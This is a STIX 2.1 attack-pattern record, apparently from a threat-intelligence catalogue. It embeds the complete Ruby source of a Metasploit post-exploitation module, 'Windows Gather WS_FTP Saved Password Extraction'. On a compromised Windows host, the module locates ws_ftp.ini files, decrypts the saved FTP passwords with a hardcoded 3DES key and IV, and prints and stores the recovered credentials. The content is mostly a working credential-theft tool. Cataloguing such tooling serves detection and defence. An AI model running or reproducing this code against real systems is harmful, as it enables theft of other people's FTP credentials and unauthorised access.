{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7c326715-9682-4762-969c-a4008b068928",
    "created": "2024-08-14T16:33:08.24236Z",
    "modified": "2024-08-14T16:33:08.242364Z",
    "name": "Windows Gather WS_FTP Saved Password Extraction",
    "description": " This module extracts weakly encrypted saved FTP Passwords from WS_FTP. It finds saved FTP connections in the ws_ftp.ini file.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/wsftp_client.rb",
            "external_id": "wsftp_client.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::UserProfiles\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather WS_FTP Saved Password Extraction',\n        'Description' => %q{\n          This module extracts weakly encrypted saved FTP Passwords\n          from WS_FTP. It finds saved FTP connections in the ws_ftp.ini file.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'theLightCosine'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_fs_stat\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    print_status('Checking Default Locations...')\n    grab_user_profiles.each do |user|\n      next if user['AppData'].nil?\n\n      check_appdata(user['AppData'] + '\\\\Ipswitch\\\\WS_FTP\\\\Sites\\\\ws_ftp.ini')\n      check_appdata(user['AppData'] + '\\\\Ipswitch\\\\WS_FTP Home\\\\Sites\\\\ws_ftp.ini')\n    end\n  end\n\n  def check_appdata(path)\n    client.fs.file.stat(path)\n    print_status(\"Found File at #{path}\")\n    get_ini(path)\n  rescue StandardError\n    print_status(\"#{path} not found ....\")\n  end\n\n  def get_ini(filename)\n    config = client.fs.file.new(filename, 'r')\n    parse = config.read\n    ini = Rex::Parser::Ini.from_s(parse)\n\n    ini.each_key do |group|\n      next if group == '_config_'\n\n      print_status(\"Processing Saved Session #{group}\")\n      host = ini[group]['HOST']\n      host = host.delete '\"'\n      username = ini[group]['UID']\n      username = username.delete '\"'\n      port =\tini[group]['PORT']\n      passwd = ini[group]['PWD']\n      passwd = decrypt(passwd)\n\n      next if passwd.nil? || (passwd == '')\n\n      port = 21 if port.nil?\n      print_good(\"Host: #{host} Port: #{port} User: #{username}  Password: #{passwd}\")\n      service_data = {\n        address: Rex::Socket.getaddress(host),\n        port: port,\n        protocol: 'tcp',\n        service_name: 'ftp',\n        workspace_id: myworkspace_id\n      }\n\n      credential_data = {\n        origin_type: :session,\n        session_id: session_db_id,\n        post_reference_name: refname,\n        username: username,\n        private_data: passwd,\n        private_type: :password\n      }\n\n      credential_core = create_credential(credential_data.merge(service_data))\n\n      login_data = {\n        core: credential_core,\n        access_level: 'User',\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }\n\n      create_credential_login(login_data.merge(service_data))\n    end\n  end\n\n  def decrypt(pwd)\n    decoded = pwd.unpack('m*')[0]\n    key = \"\\xE1\\xF0\\xC3\\xD2\\xA5\\xB4\\x87\\x96\\x69\\x78\\x4B\\x5A\\x2D\\x3C\\x0F\\x1E\\x34\\x12\\x78\\x56\\xab\\x90\\xef\\xcd\"\n    iv = \"\\x34\\x12\\x78\\x56\\xab\\x90\\xef\\xcd\"\n    des = OpenSSL::Cipher.new('des-ede3-cbc')\n\n    des.decrypt\n    des.key = key\n    des.iv = iv\n    result = des.update(decoded)\n    final = result.split(\"\\000\")[0]\n    return final\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}